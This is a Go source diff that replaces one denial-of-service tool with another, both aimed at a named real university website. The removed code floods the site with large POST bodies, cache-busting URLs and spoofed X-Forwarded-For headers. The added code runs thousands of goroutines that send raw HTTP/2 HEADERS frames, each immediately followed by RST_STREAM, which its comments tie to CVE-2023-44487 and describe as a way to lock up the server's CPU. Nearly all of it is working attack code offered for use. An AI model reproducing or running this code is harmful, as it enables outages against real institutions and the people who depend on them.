@@ -1,88 +1,85 @@
 package main
 
 import (
-	"crypto/tls"
-	"fmt"
-	"math/rand"
-	"net/http"
-	"strings"
-	"sync"
-	"sync/atomic"
-	"time"
+    "crypto/tls"
+    "fmt"
+    "net"
+    "sync/atomic"
+    "time"
+)
+
+var (
+    target  = "bbu.edu.az:443" // Host və Port
+    sni     = "bbu.edu.az"      // TLS SNI
+    workers = 3000              // Railway gücü üçün
+    resets  uint64
+    errors  uint64
 )
 
 func main() {
-	// Hədəf saytın URL-i
-	target := "https://bbu.edu.az"
-	// Railway resurslarını sona qədər istifadə etmək üçün
-	workers := 4000 
-	
-	fmt.Printf("[!!!] HAKAI-FORCE AKTİVDİR: %s\n", target)
+    fmt.Printf("[!!!] HAKAI-DEMON-V5 AKTİVDİR: %s\n", sni)
 
-	tr := &http.Transport{
-		TLSClientConfig: &tls.Config{
-			InsecureSkipVerify: true,
-			MinVersion:         tls.VersionTLS12,
-			NextProtos:         []string{"h2", "http/1.1"},
-		},
-		MaxIdleConns:        100000,
-		MaxIdleConnsPerHost: 50000,
-		// Bağlantıları açıq saxlayaraq serverin socketlərini doldururuq
-		DisableKeepAlives: false, 
-		IdleConnTimeout:   120 * time.Second,
-	}
+    for i := 0; i < workers; i++ {
+        go func() {
+            for {
+                attack()
+                // Gecikməni minimuma saxlayırıq ki, server nəfəs ala bilməsin
+                time.Sleep(10 * time.Millisecond)
+            }
+        }()
+    }
 
-	client := &http.Client{Transport: tr, Timeout: 7 * time.Second}
-	var successCount uint64
-	var crashCount uint64
+    // Statistik hesabat
+    for {
+        time.Sleep(5 * time.Second)
+        fmt.Printf("[REPORT] Rapid Reset Sent: %d | Fails: %d\n", atomic.LoadUint64(&resets), atomic.LoadUint64(&errors))
+    }
+}
 
-	var wg sync.WaitGroup
-	// 512KB Payload - Serverin RAM-ını dərhal bitirmək üçün
-	payload := "kill=" + strings.Repeat("K", 524288) 
+func attack() {
+    cfg := &tls.Config{
+        InsecureSkipVerify: true,
+        NextProtos:         []string{"h2"},
+        ServerName:         sni,
+    }
 
-	for i := 0; i < workers; i++ {
-		wg.Add(1)
-		go func(id int) {
-			defer wg.Done()
-			for {
-				// Cache bypass - Server hər sorğunu yeni sorğu kimi emal etməldir
-				u := fmt.Sprintf("%s/?v=%d&z=%d", target, time.Now().UnixNano(), rand.Int())
-				
-				req, _ := http.NewRequest("POST", u, strings.NewReader(payload))
-				
-				// Realist Headers (JA3 Fingerprint imitasiyası üçün)
-				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0")
-				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-				req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
-				req.Header.Set("Connection", "keep-alive")
-				req.Header.Set("X-Forwarded-For", fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255)))
+    // Raw TCP bağlantısı qururuq
+    conn, err := net.DialTimeout("tcp", target, 5*time.Second)
+    if err != nil {
+        atomic.AddUint64(&errors, 1)
+        return
+    }
+    defer conn.Close()
 
-				resp, err := client.Do(req)
-				atomic.AddUint64(&successCount, 1)
+    tlsConn := tls.Client(conn, cfg)
+    if err := tlsConn.Handshake(); err != nil {
+        atomic.AddUint64(&errors, 1)
+        return
+    }
+    defer tlsConn.Close()
 
-				if err == nil {
-					if resp.StatusCode >= 500 {
-						atomic.AddUint64(&crashCount, 1)
-					}
-					// Body-ni dərhal qapatmırıq ki, socket məşğul qalsın
-					time.Sleep(10 * time.Millisecond)
-					resp.Body.Close()
-				} else {
-					atomic.AddUint64(&crashCount, 1)
-					time.Sleep(5 * time.Millisecond)
-				}
-			}
-		}(i)
-	}
+    // HTTP/2 Preface & Settings - Serveri real müştəri olduğuna inandırır
+    tlsConn.Write([]byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"))
+    
+    // Sürətli RESET döngüsü (CVE-2023-44487 simulyasiyası)
+    // Server saniyədə minlərlə açılıb-qapanan stream emal etməyə çalışarkən CPU kilidlənir
+    for i := 0; i < 200; i++ {
+        streamID := uint32(2*i + 1)
+        
+        // HEADERS Frame (İmitasiya olunmuş yüngül sorğu)
+        tlsConn.Write([]byte{
+            0x00, 0x00, 0x0c, 0x01, 0x05, 
+            byte(streamID >> 24), byte(streamID >> 16), byte(streamID >> 8), byte(streamID),
+            0x82, 0x86, 0x84, 0x41, 0x8c, 0xf1, 0xe3, 0xc2, 0xe5, 0xf2, 0x3a, 0x6b,
+        })
 
-	// Səssiz Hesabat (Railway log limitinə düşməmək üçün)
-	go func() {
-		for {
-			time.Sleep(5 * time.Second)
-			fmt.Printf("[STATUS] Göndərilən: %d | Server Çöküşü (Error): %d\n", 
-				atomic.LoadUint64(&successCount), atomic.LoadUint64(&crashCount))
-		}
-	}()
-
-	wg.Wait()
+        // DƏRHAL RST_STREAM Frame (RESET Siqnalı)
+        tlsConn.Write([]byte{
+            0x00, 0x00, 0x04, 0x03, 0x00, 
+            byte(streamID >> 24), byte(streamID >> 16), byte(streamID >> 8), byte(streamID),
+            0x00, 0x00, 0x00, 0x08,
+        })
+        
+        atomic.AddUint64(&resets, 1)
+    }
 }
